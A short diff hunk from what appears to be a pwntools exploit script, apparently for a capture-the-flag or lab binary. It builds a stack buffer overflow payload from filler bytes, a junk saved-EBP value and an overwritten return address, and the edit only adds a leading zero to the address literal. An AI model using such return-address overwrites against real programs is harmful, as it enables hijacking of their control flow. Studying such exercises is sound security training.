@@ -9,7 +9,7 @@ word_size = 4
 
 buffer_bytes = b'A' * buffer_offset   # fills the buffer with 
 ebp_bytes = b'a' * word_size          # can be garbage ebp value or something else
-return_address = p32(0x80497b5)         # replace the return address with the address you found
+return_address = p32(0x080497b5)         # replace the return address with the address you found
 
 payload = buffer_bytes + ebp_bytes + return_address
 
